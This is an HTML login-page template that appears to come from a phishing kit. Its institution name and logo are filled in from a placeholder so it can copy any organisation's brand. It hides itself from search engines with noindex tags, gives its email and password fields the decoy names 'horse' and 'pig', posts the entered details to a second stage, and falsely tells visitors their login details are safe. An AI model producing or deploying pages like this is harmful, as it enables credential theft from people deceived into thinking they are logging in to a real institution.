<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex, nofollow">
    <link rel="icon" href="https://logo.clearbit.com/{{ins}}" type="image/x-icon">
    <title>{{ins}} Portal Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f7fc;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .form-holder {
            background: white;
            padding: 30px;
            box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            width: 350px;
            text-align: center;
        }
        .form-holder img {
            width: 80px;
            margin-bottom: 10px;
        }
        .form-holder h2 {
            font-size: 22px;
            margin-bottom: 20px;
            color: #333;
        }
        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }
        .input-group label {
            display: block;
            font-size: 14px;
            margin-bottom: 5px;
            color: #555;
        }
        .input-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }
        .input-group input:focus {
            border-color: #0d4f8b;
            outline: none;
        }
        .submit-btn {
            background: #0d4f8b;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            font-size: 18px;
            border-radius: 5px;
            cursor: pointer;
            transition: 0.3s;
        }
        .submit-btn:hover {
            background: #1874cd;
        }
        .privacy {
            font-size: 12px;
            color: gray;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="form-holder">
        <img src="https://logo.clearbit.com/{{ins}}" alt="Logo">
        <h2>Login to {{ins}}</h2>
        <form action="second" method="POST">
            <div class="input-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="horse" required>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="pig" required>
            </div>
            <button type="submit" class="submit-btn">Continue</button>
        </form>
        <p class="privacy">Your login details are safe and secure.</p>
    </div>
</body>
</html>
